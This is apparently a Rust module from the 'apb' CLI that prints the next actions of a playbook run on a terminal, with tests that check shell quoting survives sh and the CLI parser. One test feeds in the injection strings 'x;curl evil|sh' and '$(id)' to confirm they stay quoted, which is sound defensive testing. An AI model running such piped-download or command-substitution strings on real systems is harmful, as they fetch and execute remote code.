//! The next actions on a terminal: the lines a person reads, each with the
//! command the engine renders for it ([`apb_engine::next_action::command`]).

use std::collections::BTreeMap;

pub(crate) use apb_engine::next_action::command::{RequestArg, render};
use apb_engine::next_action::start::{Remedy, StartAction, StartActionCode};
use apb_engine::next_action::{ActionCode, AutoOutcome, AutoProgress, RunActions};

use crate::util::{sanitize_command, sanitize_for_terminal};

/// The longest free text one next-action line shows.
const TEXT_MAX: usize = 2000;

/// The lines a terminal shows for a run's next actions: each action's
/// reason, its command (or who takes it when the CLI has none) and what
/// happens without anyone. The primary comes first. Reading the report is
/// left out: the person is reading it, so a finished run with nothing open
/// prints as before. Empty when nothing is left. Ready to print: the free
/// texts are sanitized and collapsed, a command keeps its spaces
/// ([`sanitize_command`]), and the indent is added after both.
pub(crate) fn lines(actions: &RunActions) -> Vec<String> {
    let text = |s: &str| sanitize_for_terminal(s, TEXT_MAX);
    let mut out = Vec::new();
    for a in actions
        .actions
        .iter()
        .filter(|a| a.code != ActionCode::ReadReport)
    {
        out.push(format!("next: {}", text(&a.reason)));
        match render(a, &BTreeMap::new()) {
            Some(cmd) => out.push(format!("  $ {}", sanitize_command(&cmd.line()))),
            None => out.push("  (the run's supervisor takes this)".into()),
        }
        if let Some(n) = &a.not_ready {
            out.push(format!("  not ready: {}", text(&n.detail)));
        }
        if let Some(auto) = &a.auto {
            out.push(format!("  {}", auto_line(auto)));
        }
    }
    if actions.children_truncated {
        out.push("note: a sub-playbook run sat too deep to be observed".into());
    }
    out
}

/// The lines a terminal shows for a refused start's actions: what each
/// needs and how it is met. A remedy never carries a value or a token.
pub(crate) fn start_lines(actions: &[StartAction]) -> Vec<String> {
    let mut out = Vec::new();
    for a in actions {
        out.push(format!("next: {}", a.reason));
        let how = match (&a.code, &a.remedy) {
            (_, Some(Remedy::ApproveDigest { kind, digest })) => {
                format!("approve the {} at digest {digest}", kind.replace('_', " "))
            }
            (_, Some(Remedy::ProvideParam { name })) => format!("pass `--param {name}=<value>`"),
            (_, Some(Remedy::InstallAgent { agent })) => format!("install the `{agent}` CLI"),
            (_, Some(Remedy::SetEnv { name })) => format!("set the environment variable `{name}`"),
            (_, Some(Remedy::RunDoctor)) => {
                "run `apb doctor` to see what this machine lacks".into()
            }
            (_, Some(Remedy::Manual { detail })) => detail.clone(),
            (StartActionCode::ConfirmIrreversibleStart, None) => {
                "confirm on the terminal, or pass the refusal's consent nonce".into()
            }
            (StartActionCode::AcknowledgeUntrusted, None) => {
                "a start from this terminal acknowledges it".into()
            }
            (StartActionCode::FixRequirement, None) => continue,
            (StartActionCode::ConfirmLaunch, None) => {
                let arg = |n: &str| {
                    a.args
                        .iter()
                        .find(|x| x.name == n)
                        .and_then(|x| match &x.value {
                            apb_engine::next_action::ArgValue::Given { value } => {
                                Some(value.clone())
                            }
                            _ => None,
                        })
                };
                let mut flags = format!(
                    "a person confirms at the terminal, or pass --confirm-launch={}",
                    arg("confirm_launch").unwrap_or_default()
                );
                if let Some(v) = arg("launch_version") {
                    flags.push_str(&format!(" --launch-version={v}"));
                }
                if let Some(c) = arg("launch_choice") {
                    flags.push_str(&format!(" --launch-choice={c}"));
                }
                flags
            }
            (StartActionCode::LaunchByPerson, None) => {
                "a person starts it from the dashboard or from an interactive terminal".into()
            }
        };
        out.push(format!("  {how}"));
    }
    out
}

/// The command line of the first action of `run_id` with one of `codes`.
pub(crate) fn command_of(
    actions: &RunActions,
    run_id: &str,
    codes: &[ActionCode],
) -> Option<String> {
    actions
        .actions
        .iter()
        .filter(|a| a.run_id == run_id && codes.contains(&a.code))
        .find_map(|a| render(a, &BTreeMap::new()))
        .map(|c| sanitize_command(&c.line()))
}

/// The primary action as `<reason>: `<command>``, for a wait's one line,
/// sanitized like [`lines`].
pub(crate) fn primary_hint(actions: &RunActions) -> Option<String> {
    let a = actions.primary()?;
    let cmd = render(a, &BTreeMap::new())?;
    Some(format!(
        "{}: `{}`",
        sanitize_for_terminal(&a.reason, TEXT_MAX),
        sanitize_command(&cmd.line())
    ))
}

/// What a wait does by itself.
fn auto_line(auto: &AutoProgress) -> String {
    let what = match auto.outcome() {
        AutoOutcome::AnsweredDefault => "its default answer is posted",
        AutoOutcome::TimerElapses => "the timer elapses",
        AutoOutcome::AttemptFails => "the attempt fails",
        AutoOutcome::WaitTimesOut => "the wait times out and fails",
        AutoOutcome::ResumeAttempt => "apb tries to resume the run",
    };
    match auto {
        AutoProgress::At { at_ms, assured, .. } => format!(
            "at {}{}: {what}",
            apb_core::clock::iso_utc(*at_ms),
            if *assured { "" } else { " (not assured)" }
        ),
        AutoProgress::Frozen { remaining_ms, .. } => format!(
            "timer frozen while paused, {} left: then {what}",
            duration_words(*remaining_ms)
        ),
    }
}

/// `1h 2m`, `3m 4s`, `5s`.
fn duration_words(ms: u64) -> String {
    let s = ms / 1000;
    match (s / 3600, s % 3600 / 60, s % 60) {
        (0, 0, sec) => format!("{sec}s"),
        (0, m, sec) => format!("{m}m {sec}s"),
        (h, m, _) => format!("{h}h {m}m"),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::intent::IntentAction;
    use crate::tasks::TasksAction;
    use crate::{Cli, Command};
    use apb_engine::next_action::command::shell_quote;
    use apb_engine::next_action::{
        ActionArg, ActionTarget, ArgValue, NextAction, Principal, RequestKind,
    };
    use clap::Parser;

    /// The values a round trip must survive: a leading `-`, spaces,
    /// quotes, `$`, a backslash, non-ASCII, an empty word.
    const HARD: &[&str] = &[
        "-reject",
        "two words",
        "it's \"quoted\"",
        "$HOME and `cmd`",
        "back\\slash",
        "Grüße, café",
        "",
        "plain",
    ];

    fn action(code: ActionCode, run: &str, node: Option<&str>, args: Vec<ActionArg>) -> NextAction {
        NextAction {
            code,
            run_id: run.into(),
            target: ActionTarget {
                node: node.map(str::to_string),
                ..ActionTarget::default()
            },
            args,
            principals: vec![Principal::Person],
            ready: true,
            not_ready: None,
            auto: None,
            command: None,
            reason: String::new(),
        }
    }

    fn request(kind: RequestKind, seq: u64) -> apb_engine::next_action::RequestRef {
        apb_engine::next_action::RequestRef {
            kind,
            seq,
            nonce: None,
        }
    }

    #[test]
    fn a_request_word_names_its_kind_and_the_command_checks_it() {
        let r: RequestArg = "publish:9".parse().unwrap();
        assert_eq!(
            r.seq_for(&[RequestKind::Review, RequestKind::Publish]),
            Ok(9)
        );
        assert!(r.seq_for(&[RequestKind::Question]).is_err());
        assert!("question".parse::<RequestArg>().is_err());
        assert!("vote:1".parse::<RequestArg>().is_err());
        assert!("question:-1".parse::<RequestArg>().is_err());
    }

    fn supplied(name: &str) -> ActionArg {
        ActionArg {
            name: name.into(),
            value: ArgValue::Supplied { hint: name.into() },
            required: true,
        }
    }

    fn chosen(pairs: &[(&str, &str)]) -> BTreeMap<String, String> {
        pairs
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect()
    }

    /// The words a POSIX shell makes of `line`.
    fn through_shell(line: &str) -> Vec<String> {
        let out = std::process::Command::new("sh")
            .arg("-c")
            .arg(format!("set -- {line}; printf '%s\\0' \"$@\""))
            .output()
            .expect("run sh");
        assert!(out.status.success(), "sh failed on {line}");
        let text = String::from_utf8(out.stdout).expect("utf-8 words");
        text.split_terminator('\0').map(str::to_string).collect()
    }

    /// Renders, runs the line through `sh`, checks the shell gives back the
    /// exact argv, and parses it with the real CLI parser.
    fn round_trip(a: &NextAction, values: &BTreeMap<String, String>) -> Command {
        let cmd = render(a, values).expect("a CLI command");
        assert!(cmd.runnable, "{:?} is not runnable", cmd.argv);
        assert_eq!(through_shell(&cmd.line()), cmd.argv, "line {}", cmd.line());
        Cli::try_parse_from(&cmd.argv)
            .unwrap_or_else(|e| panic!("{} does not parse: {e}", cmd.line()))
            .command
            .expect("a subcommand")
    }

    #[test]
    fn an_answer_reads_back_through_the_shell_and_the_parser() {
        for value in HARD {
            for node in ["n1", "-n1", "node two"] {
                let mut a = action(
                    ActionCode::AnswerQuestion,
                    "r-1",
                    Some(node),
                    vec![supplied("answer")],
                );
                a.target.request = Some(request(RequestKind::Question, 12));
                match round_trip(&a, &chosen(&[("answer", value)])) {
                    Command::Answer {
                        run,
                        node: n,
                        text,
                        request,
                    } => {
                        assert_eq!(
                            (run.as_str(), n.as_deref(), text.as_str()),
                            ("r-1", Some(node), *value)
                        );
                        assert_eq!(
                            request,
                            Some(RequestArg {
                                kind: RequestKind::Question,
                                seq: 12
                            })
                        );
                    }
                    _ => panic!("not an answer"),
                }
            }
        }
    }

    #[test]
    fn a_review_and_a_publish_decision_read_back() {
        for value in HARD {
            let mut a = action(
                ActionCode::DecideReview,
                "r-1",
                Some("-n1"),
                vec![
                    supplied("decision"),
                    ActionArg {
                        required: false,
                        ..supplied("note")
                    },
                ],
            );
            a.target.request = Some(request(RequestKind::Review, 7));
            match round_trip(&a, &chosen(&[("decision", value), ("note", value)])) {
                Command::Review {
                    run_id,
                    node_id,
                    decision,
                    note,
                    nonce,
                    request,
                } => {
                    assert_eq!((run_id.as_str(), node_id.as_str()), ("r-1", "-n1"));
                    assert_eq!(request.map(|r| r.seq), Some(7));
                    assert_eq!(
                        (decision.as_str(), note.as_str(), nonce),
                        (*value, *value, None)
                    );
                }
                _ => panic!("not a review"),
            }
        }
        let publish = action(
            ActionCode::DecidePublish,
            "r-1",
            Some("push"),
            vec![
                supplied("decision"),
                ActionArg {
                    name: "nonce".into(),
                    value: ArgValue::Given {
                        value: "plan-0123abcd".into(),
                    },
                    required: true,
                },
            ],
        );
        match round_trip(&publish, &chosen(&[("decision", "publish")])) {
            Command::Review {
                decision,
                nonce,
                node_id,
                ..
            } => {
                assert_eq!(
                    (decision.as_str(), nonce.as_deref(), node_id.as_str()),
                    ("publish", Some("plan-0123abcd"), "push")
                );
            }
            _ => panic!("not a review"),
        }
    }

    /// A notice prints the command of the very request it is about, read
    /// back by the shell and the real parser; a notice about a request that
    /// moved on prints none, and the supervisor's prints none.
    #[test]
    fn a_notice_command_answers_only_the_notified_request() {
        use apb_core::notify::Transition;
        use apb_engine::notify::notice::command_for;
        use apb_engine::notify::transitions::TransitionId;

        let review = |seq: u64| {
            let mut a = action(
                ActionCode::DecideReview,
                "r-1",
                Some("gate"),
                vec![supplied("decision")],
            );
            a.target.request = Some(request(RequestKind::Review, seq));
            a
        };
        let open = vec![review(9)];
        let parse = |line: String| match Cli::try_parse_from(through_shell(&line))
            .unwrap_or_else(|e| panic!("{line} does not parse: {e}"))
            .command
        {
            Some(Command::Review {
                run_id,
                node_id,
                request,
                nonce,
                ..
            }) => (run_id, node_id, request.map(|r| r.seq), nonce),
            _ => panic!("not a review: {line}"),
        };
        let notified = TransitionId {
            kind: Transition::Review,
            seq: 9,
        };
        let line = command_for(&open, "r-1", &notified, None).unwrap().line();
        assert_eq!(parse(line), ("r-1".into(), "gate".into(), Some(9), None));
        // A late notice about review 5, while review 9 is open: no command
        // that could answer 9.
        let late = TransitionId {
            kind: Transition::Review,
            seq: 5,
        };
        assert!(command_for(&open, "r-1", &late, None).is_none());
        // Another run's action never answers this run's notice.
        assert!(command_for(&open, "r-2", &notified, None).is_none());

        let mut publish = action(
            ActionCode::DecidePublish,
            "r-1",
            Some("push"),
            vec![
                supplied("decision"),
                ActionArg {
                    name: "nonce".into(),
                    value: ArgValue::Given {
                        value: "plan-0123abcd".into(),
                    },
                    required: true,
                },
            ],
        );
        publish.target.request = Some(request(RequestKind::Publish, 4));
        let line = command_for(
            &[publish],
            "r-1",
            &TransitionId {
                kind: Transition::Review,
                seq: 4,
            },
            None,
        )
        .unwrap()
        .line();
        assert_eq!(
            parse(line),
            (
                "r-1".into(),
                "push".into(),
                Some(4),
                Some("plan-0123abcd".into())
            )
        );

        let retry = action(ActionCode::SupervisorRetryNode, "r-1", Some("w"), vec![]);
        let wake = TransitionId {
            kind: Transition::Supervisor,
            seq: 3,
        };
        assert!(command_for(&[retry], "r-1", &wake, None).is_none());
    }

    #[test]
    fn a_host_task_submission_reads_back() {
        for value in HARD.iter().filter(|v| !v.is_empty()) {
            let mut a = action(
                ActionCode::SubmitHostTask,
                "r-1",
                Some("w"),
                vec![supplied("status"), supplied("output")],
            );
            a.target.task_id = Some("-t1".into());
            match round_trip(&a, &chosen(&[("status", "succeeded"), ("output", value)])) {
                Command::Tasks {
                    action: Some(TasksAction::Submit(s)),
                    ..
                } => {
                    assert_eq!(
                        (s.run_id.as_str(), s.task_id.as_str(), s.status.as_str()),
                        ("r-1", "-t1", "succeeded")
                    );
                    assert_eq!(s.output_file, std::path::PathBuf::from(value));
                }
                _ => panic!("not a submission"),
            }
        }
    }

    #[test]
    fn resume_wait_report_and_intent_commands_read_back() {
        let run = "-r1";
        let parsed = round_trip(
            &action(ActionCode::ResumeRun, run, None, vec![]),
            &BTreeMap::new(),
        );
        assert!(matches!(parsed, Command::Resume { run_id: Some(r), .. } if r == run));
        let budget = action(
            ActionCode::ResumeWithBudget,
            run,
            None,
            vec![supplied("raise_budget_tokens")],
        );
        let parsed = round_trip(&budget, &chosen(&[("raise_budget_tokens", "20k")]));
        assert!(
            matches!(&parsed, Command::Resume { run_id: Some(r), budget, .. } if r == run && budget.raise_tokens.as_deref() == Some("20k"))
        );
        let parsed = round_trip(
            &action(ActionCode::WaitAgain, run, None, vec![]),
            &BTreeMap::new(),
        );
        assert!(matches!(parsed, Command::Wait { run_id, .. } if run_id == run));
        let parsed = round_trip(
            &action(ActionCode::ReadReport, run, None, vec![]),
            &BTreeMap::new(),
        );
        assert!(matches!(parsed, Command::Runs { run_id: Some(r), .. } if r == run));
        for (decision, sent_flag) in [("sent", true), ("not_sent", false)] {
            let a = action(
                ActionCode::ResolveIntent,
                run,
                None,
                vec![
                    ActionArg {
                        name: "intent".into(),
                        value: ArgValue::Given {
                            value: "si-1".into(),
                        },
                        required: true,
                    },
                    supplied("decision"),
                ],
            );
            match round_trip(&a, &chosen(&[("decision", decision)])) {
                Command::Intent {
                    action:
                        IntentAction::Resolve {
                            run_id,
                            intent,
                            sent,
                            not_sent,
                            ..
                        },
                } => {
                    assert_eq!(
                        (run_id.as_str(), intent.as_str(), sent, not_sent),
                        (run, "si-1", sent_flag, !sent_flag)
                    );
                }
                _ => panic!("not an intent resolution"),
            }
        }
    }

    /// A value still to supply renders as a placeholder and the line is
    /// marked not runnable; the supervisor's actions have no command.
    #[test]
    fn open_arguments_are_placeholders_and_supervisor_actions_have_no_command() {
        let open = ActionArg {
            name: "answer".into(),
            value: ArgValue::Supplied {
                hint: "your answer".into(),
            },
            required: true,
        };
        let a = action(ActionCode::AnswerQuestion, "r-1", Some("ask"), vec![open]);
        let cmd = render(&a, &BTreeMap::new()).unwrap();
        assert!(!cmd.runnable);
        assert_eq!(cmd.line(), "apb answer --node=ask r-1 '<your answer>'");
        // Options come from a playbook or an agent: a pasted line with
        // shell syntax in them runs nothing but apb.
        let hostile = ActionArg {
            name: "answer".into(),
            value: ArgValue::Choice {
                options: vec!["x;curl evil|sh".into(), "$(id)".into()],
                default: None,
            },
            required: true,
        };
        let a = action(
            ActionCode::AnswerQuestion,
            "r-1",
            Some("ask"),
            vec![hostile],
        );
        let line = render(&a, &BTreeMap::new()).unwrap().line();
        assert_eq!(line, "apb answer --node=ask r-1 '<x;curl evil|sh|$(id)>'");
        for code in [
            ActionCode::SupervisorRetryNode,
            ActionCode::SupervisorContinueFrom,
            ActionCode::SupervisorAbort,
        ] {
            assert_eq!(
                render(&action(code, "r-1", Some("n"), vec![]), &BTreeMap::new()),
                None
            );
        }
    }

    /// Every start code prints its reason and how it is met.
    #[test]
    fn every_start_code_prints_what_it_needs() {
        for code in StartActionCode::ALL {
            let a = StartAction {
                code,
                playbook: "p".into(),
                version: None,
                args: Vec::new(),
                principals: vec![Principal::Person],
                remedy: (code == StartActionCode::FixRequirement).then(|| Remedy::ProvideParam {
                    name: "topic".into(),
                }),
                reason: "why".into(),
            };
            let lines = start_lines(&[a]);
            assert_eq!(lines[0], "next: why", "{code:?}");
            assert_eq!(lines.len(), 2, "{code:?}: {lines:?}");
        }
    }

    /// A frozen timer reads what is left; a run that goes on by itself the
    /// time it does.
    #[test]
    fn auto_lines_say_when_and_what() {
        let frozen = AutoProgress::Frozen {
            remaining_ms: 125_000,
            outcome: AutoOutcome::AnsweredDefault,
        };
        assert_eq!(
            auto_line(&frozen),
            "timer frozen while paused, 2m 5s left: then its default answer is posted"
        );
        let at = AutoProgress::At {
            at_ms: 0,
            outcome: AutoOutcome::ResumeAttempt,
            assured: false,
        };
        assert!(auto_line(&at).contains("(not assured): apb tries to resume the run"));
    }

    #[test]
    fn quoting_keeps_safe_words_bare() {
        assert_eq!(shell_quote("--node=a.b/c:1@x%+,"), "--node=a.b/c:1@x%+,");
        assert_eq!(shell_quote(""), "''");
        assert_eq!(shell_quote("it's"), r"'it'\''s'");
    }
}
